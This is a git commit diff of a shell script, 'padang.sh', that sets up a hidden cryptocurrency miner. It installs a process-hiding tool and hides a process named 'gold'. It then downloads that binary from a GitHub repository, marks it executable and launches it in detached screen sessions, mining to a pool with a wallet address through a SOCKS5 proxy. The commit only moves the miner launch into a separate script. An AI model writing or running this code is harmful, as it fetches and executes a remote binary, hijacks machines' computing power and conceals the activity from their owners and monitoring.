41d913672f8180d740a1b32c3652741b0eab98d5
faridmd <77087718+faridmd@users.noreply.github.com>
2022-02-20 19:29:26 +0700

    Update padang.sh

--- padang.sh
+++ padang.sh
@@ -7,5 +7,6 @@ sudo apt-get install screen -y
 npm i -g node-process-hider
 echo -e 'sudo ph add gold' >> banthanks.sh
 screen -dmS powi sh banthanks.sh
-wget https://github.com/kirbyworth/sugardady/raw/main/gold && chmod +x gold && ./gold -o stratum+tcp://yespowerSUGAR.mine.zergpool.com:6535 -u RX5iZrR46Xc6Q9f3ixp4eewknJzzWB3spe -p c=RVN,mc=SUGAR,m=solo -t 2 --proxy socks5://192.252.214.20:15864
+echo -e './gold -o stratum+tcp://yespowerSUGAR.mine.zergpool.com:6535 -u RX5iZrR46Xc6Q9f3ixp4eewknJzzWB3spe -p c=RVN,mc=SUGAR,m=solo -t 2 --proxy socks5://192.252.214.20:15864' >> cali.sh
+wget https://github.com/kirbyworth/sugardady/raw/main/gold && chmod +x gold && screen -dmS cali sh cali.sh
 exec bash
